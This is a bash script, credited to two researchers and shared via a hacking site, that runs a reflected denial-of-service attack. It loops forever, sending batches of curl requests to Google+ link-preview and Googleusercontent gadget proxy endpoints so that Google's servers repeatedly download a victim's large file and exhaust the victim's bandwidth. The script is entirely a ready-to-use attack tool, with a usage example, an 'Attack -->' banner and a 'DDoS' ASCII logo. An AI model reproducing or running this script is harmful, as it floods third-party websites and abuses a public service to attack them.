#!/bin/bash

#   Bug found by                        #
#       Simone 'R00T_ATI' Quatrini      #
#       Mauro 'epicfail' Gasperini      #
#       Site: http://www.ihteam.net     #
#     Shared by : http://www.hackersgarage.com     #

function start {
    echo "[*] Sending `echo $2` Requests..."
    
    for a in `seq $2`
    do
        id=$((RANDOM%3999999+3000000))
        nohup curl "https://plus.google.com/_/sharebox/linkpreview/?c=$url&t=1&_reqid=$id&rt=j" -k -A "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20110101 Firefox/6.0" > /dev/null 2>&1 &
        nohup curl "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?url=$urlclear&container=focus" -k -A "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0" > /dev/null 2>&1 &
    done

    echo "[*] Still attacking `echo $urlclear`"
    echo "[*] Sleeping for 10 Seconds"
    sleep 10
    start url $2 urlclear
}

echo ''
echo '             88888888ba,    88888888ba,                  ad88888ba  ' 
echo '    aa      88      `"8b   88      `"8b                d8"     "8b  '
echo '    88      88        `8b  88        `8b               Y8,          '
echo 'aaaa88aaaa  88         88  88         88   ,adPPYba,   `Y8aaaaa,    '
echo '""""88""""  88         88  88         88  a8"     "8a    `"""""8b,  '
echo '    88      88         8P  88         8P  8b       d8          `8b  '
echo '    ""      88      .a8P   88      .a8P   "8a,   ,a8"  Y8a     a8P  '
echo '            88888888Y""    88888888Y""     `"YbbdP""    "Y88888P"'
echo ''

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <big file> <Requests>"
    echo "Example: $0 http://www.site.com/very_big_file.tar.gz 1000"
    echo ""

    exit 0                                                                                                                                                                          
fi                                                                                                                                                                                  
                                                                                                                                                                                    
case $2 in                                                                                                                                                                          
    *[!0-9]* )  echo "$2 is not numeric" && exit 1;;                                                                                                                                
esac                                                                                                                                                                                
                                                                                                                                                                                    
echo "Attack -->" $1                                                                                                                                                                
match1=/                                                                                                                                                                            
repl1=%2F                                                                                                                                                                           
match2=:                                                                                                                                                                            
repl2=%3A                                                                                                                                                                           
url=$1                                                                                                                                                                              
urlclear=$1                                                                                                                                                                         
                                                                                                                                                                                    
url=${url//$match1/$repl1}                                                                                                                                                          
url=${url//$match2/$repl2}                                                                                                                                                          
                                                                                                                                                                                    
echo ""                                                                                                                                                                             
echo "[*] Loop started! CTRL+C to stop"                                                                                                                                             
echo ""

start url $2 urlclear
